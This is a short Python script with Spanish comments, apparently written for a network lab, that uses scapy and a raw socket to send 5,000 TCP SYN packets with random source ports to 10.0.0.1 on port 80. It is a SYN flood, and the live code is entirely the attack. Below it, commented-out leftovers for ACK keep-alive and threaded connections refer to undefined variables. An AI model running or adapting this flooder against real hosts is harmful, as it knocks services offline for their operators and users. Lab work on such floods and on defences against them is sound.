from scapy.all import *
import threading
import time
import socket

def create_syn_packet(dst_ip,dst_port):
    # Crear el paquete SYN con scapy
    source_ports = list(range(1024, 65535))
    sport = random.choice(source_ports)
    packet = Ether() / IP(dst=dst_ip) / TCP(sport=sport, dport=dst_port, flags='S')
    
    # Convertir el paquete a bytes
    return bytes(packet)

def send_packet(packet, iface):
    # Crear un socket raw
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    
    # Configurar la interfaz
    sock.bind((iface, 0))

    # Enviar el paquete
    sock.send(packet)
    print("Paquete SYN enviado!")


if __name__ == "__main__":
    target_ip = "10.0.0.1"  # IP del servidor de prueba
    target_port = 80      # Puerto del servidor de prueba
    for i in range(0,5000):
        syn = create_syn_packet(target_ip,target_port)
        send_packet(syn, 'h2-eth0')

    #if syn_ack is None:
    #    print(f"Conexión a {ip}:{port} falló al recibir SYN-ACK.")
    #    return
    #else:
    #   print(syn_ack)

    # Asegúrate de que se haya recibido un SYN-ACK
    #if syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 'SA':
    #    # Crear el paquete ACK para completar el three-way handshake
    #    ack = IP(dst=ip)/TCP(dport=port, sport=syn_ack[TCP].dport, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
    #    send(ack)
    #    print(f"Conexión establecida a {ip}:{port}")#

        # Enviar paquetes TCP con la bandera ACK para mantener la conexión viva
    #    while True:
    #        try:
    #            # El paquete ACK para mantener la conexión
    #            keep_alive = IP(dst=ip)/TCP(dport=port, sport=syn_ack[TCP].dport, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
    #            send(keep_alive)
    #            print(f"Enviando ACK a {ip}:{port}")
    #            time.sleep(1)  # Pausa breve entre los envíos
    #        except KeyboardInterrupt:
    #            print("Interrumpido por el usuario.")
    #            break
    #        except Exception as e:
    #            print(f"Error: {e}")
    #            break
    #else:
    #    print(f"No se recibió un SYN-ACK válido desde {ip}:{port}")


    # Crea múltiples hilos para simular múltiples conexiones simultáneas
    #for i in range(1):  # Ajusta el número de hilos según sea necesario
     #   thread = threading.Thread(target=send_tcp_ack, args=(target_ip, target_port))
      #  thread.start()
       # time.sleep(10)  # Retraso breve para escalonar la creación de conexiones
